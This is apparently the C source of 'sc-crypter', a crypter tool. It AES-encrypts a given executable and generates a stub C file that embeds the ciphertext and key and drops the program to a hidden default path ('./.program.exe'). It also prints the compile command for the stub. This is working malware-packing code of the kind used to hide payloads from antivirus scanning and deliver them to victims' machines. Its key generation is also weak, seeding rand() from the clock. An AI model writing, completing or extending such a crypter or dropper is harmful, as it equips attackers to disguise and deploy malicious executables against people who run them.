#include <time.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#include "lib/aes.h"
#include "lib/file.h"

#define DEF_EXE_PATH_NAME "./.program.exe"  // It's used when --path is not specified

#define OUT_FNAME "out_stub%d.c"  // The output filename format
#define OUT_FNAME_SIZE 13  // The max size of the output filename
#define MAX_OUT_FNAME_NUM 99  // The max number id of the output filename


/* Generic functions */

void help() {
    puts("Usage: sc-crypter <file> [--key file] [--path path]\n");
    puts("Options: ");
    printf("  --key <file>   Set the %dbit key to the one contained in <file>. If this option is not specified, the key will be random.\n",
            KEY_SIZE * 8);
    printf("  --path <path>  Set the path (including the filename) of the program that will be dropped by the stub to <path>. If it is not specified, the path will be %s.\n",
            DEF_EXE_PATH_NAME);
}


void *smalloc(size_t size) {
    void *p = malloc(size);
    if(p == NULL)
        fatal(1, "FATAL: Nao foi possivel alocar %zu bytes.\n", size)
    
    memset(p, 0, size);
    return p;
}


/* Parse args funcions */

void randomKey(uint8_t key[KEY_SIZE]) {
    srand(time(NULL));
    for(int i = 0; i < KEY_SIZE; i++) {
        uint8_t value = rand() % UINT8_MAX;
        key[i] = value;
    }
}


void addKey(const char *s, uint8_t *key) {
    UNIV_FILE file = file_open(s, M_READ);
    file_read(key, KEY_SIZE, file);
    file_close(file);
}


void addPath(const char *s, char **path) {
    SIZ size = strlen(s) + 1;
    *path = (char *) smalloc(size); 
    strcpy(*path, s);
}


bool parseArgs(int argc, char *argv[], uint8_t *key, char **path) {
    if(argc < 2 || argc % 2 == 1)
        return false;

    bool keySet = false, pathSet = false;
    for(int i = 0; i < 4; i+=2) {
        if(argc <= i + 3)
            break;

        if(strcmp(argv[i+2], "--key") == 0) {
            addKey(argv[i+3], key);
            keySet = true;
        } else if(strcmp(argv[i+2], "--path") == 0) {
            addPath(argv[i+3], path);
            pathSet = true;
        } else
            return false;
    }

    if(!keySet)
        randomKey(key);
    if(!pathSet)
        addPath(DEF_EXE_PATH_NAME, path);

    return true;
}


/* Read file functions */

uint8_t *encrypt(const uint8_t *iniData, SIZ *iniSize, uint8_t key[KEY_SIZE]) {
    uint8_t *data = NULL;
    SIZ size = *iniSize;

    uint8_t toAdd = 16 - (size % 16);
    size += toAdd;
    data = (uint8_t *) smalloc(size);

    for(unsigned int i = *iniSize; i < size; i++) 
        data[i] = toAdd;

    memcpy(data, iniData, *iniSize);

    uint8_t iv[] = IV;

    struct AES_ctx context;
    AES_init_ctx_iv(&context, key, iv);
    AES_CBC_encrypt_buffer(&context, data, size);

    *iniSize = size;
    return data;
}


uint8_t *readAndEnc(char *fname, SIZ *fsize, uint8_t *key) {
    UNIV_FILE file = file_open(fname, M_READ);
    *fsize = file_getSize(file);

    // Get the content of the file
    uint8_t *content = (uint8_t *) smalloc(*fsize);
    file_read(content, *fsize, file);
    file_close(file);

    // Encrypt the content
    uint8_t *ret = encrypt(content, fsize, key);
    free(content);

    return ret;
}


/* Output file functions */

void findNewFile(char *dest) {
    char temp[OUT_FNAME_SIZE] = {0};
    int i;
    
    for(i = 0; i <= MAX_OUT_FNAME_NUM; i++) {
        memset(temp, 0, OUT_FNAME_SIZE);
        sprintf(temp, OUT_FNAME, i);

        if(!file_exists(temp))
            break;
    }
    if(i > MAX_OUT_FNAME_NUM)
        fatal(0, "FATAL: Nao foi possivel achar um numero valido para o stub.\n")
    
    strcpy(dest, temp);
}


char *genStubData(uint8_t *enc, SIZ iniSize, uint8_t *key, char *path, SIZ *stubSize) {
    // Get the max size of the new stub
    SIZ baseSize = strlen("#define ENC_CONTENT {}\n#define ENC_SIZE ______ \n#define KEY {}\n#define PATH \"\"\n");
    baseSize += 4 * iniSize + 4 * KEY_SIZE + strlen(path) + 10;
    *stubSize += baseSize;

    char *p = (char *) smalloc(*stubSize);

    /* Generate the ENC_CONTENT macro */
    strcat(p, "#define ENC_CONTENT {");
    char buff[33];

    for(int i = 0; i < iniSize; i+=8) {
        memset(buff, 0, 33);
        sprintf(buff, "%u,%u,%u,%u,%u,%u,%u,%u", 
                enc[i], enc[i+1], enc[i+2], enc[i+3], enc[i+4], enc[i+5], enc[i+6], enc[i+7]);
        
        if(i > 0)
            strcat(p, ",");
        strcat(p, buff);
    } 

    /* Generate the ENC_SIZE macro */
    char strSize[8];
    sprintf(strSize, "%u", iniSize);
    strcat(p, "}\n#define ENC_SIZE ");
    strcat(p, strSize);
    
    /* Generate the KEY macro */
    strcat(p, "\n#define KEY {");
    for(int i = 0; i < KEY_SIZE; i+=8) {
        memset(buff, 0, 33);
        sprintf(buff, "%u,%u,%u,%u,%u,%u,%u,%u", 
                key[i], key[i+1], key[i+2], key[i+3], key[i+4], key[i+5], key[i+6], key[i+7]);
        
        if(i > 0)
            strcat(p, ",");
        strcat(p, buff);
    } 

    /* Generate the PATH macro */
    strcat(p, "}\n#define PATH \"");
    strcat(p, path);
    strcat(p, "\"\n");

    return p;
}


void genAndWriteStub(char *outfname, uint8_t *encContent, SIZ fsize, uint8_t *key, char *path) {
    findNewFile(outfname);

    UNIV_FILE stub = file_open("stub.c", M_READ);
    SIZ iniStubSize = file_getSize(stub); 
    
    // Get the stub code
    char *stubDef = (char *) smalloc(iniStubSize + 1);
    file_read(stubDef, iniStubSize, stub);
    file_close(stub);

    // Put the data (file content, file siz, key, etc) into the stub code
    SIZ stubSize = iniStubSize; 
    char *stubData = genStubData(encContent, fsize, key, path, &stubSize);
    strncat(stubData, stubDef, iniStubSize);

    // Remove remaining size
    SIZ remainSize = 0;
    for(int i = stubSize - 1; i >= 0; i--, remainSize++) {
        if(stubData[i] != 0)
            break;
    }
    stubSize -= remainSize;

    // Write the new stub into the output file
    UNIV_FILE outf = file_open(outfname, M_WRITE_NEW);
    file_write(stubData, stubSize, outf);
    file_close(outf);

    free(stubDef);
    free(stubData);
}


/* Main */

int main(int argc, char *argv[]) {
    uint8_t key[KEY_SIZE] = {0};
    char *path = NULL;

    if(!parseArgs(argc, argv, key, &path)) {
        help();
        return 1;
    }

    uint8_t *encContent = NULL;
    SIZ fsize = 0;

    // Open file, read it's contents and encrypt them. 
    char *fname = argv[1];
    encContent = readAndEnc(fname, &fsize, key);

    // Find a new file (a non-existent one), generate a stub with the encrypted contents and write it into the file 
    char outfname[OUT_FNAME_SIZE] = {0};
    genAndWriteStub(outfname, encContent, fsize, key, path);

    printf("Output .c file: %s\n\n", outfname);
    printf("Commands:\n gcc %s -std=c99 -L./lib -lstatic -o [EXECUTABLE_NAME]\n", outfname);

    free(path);
    free(encContent);
    return 0;
}
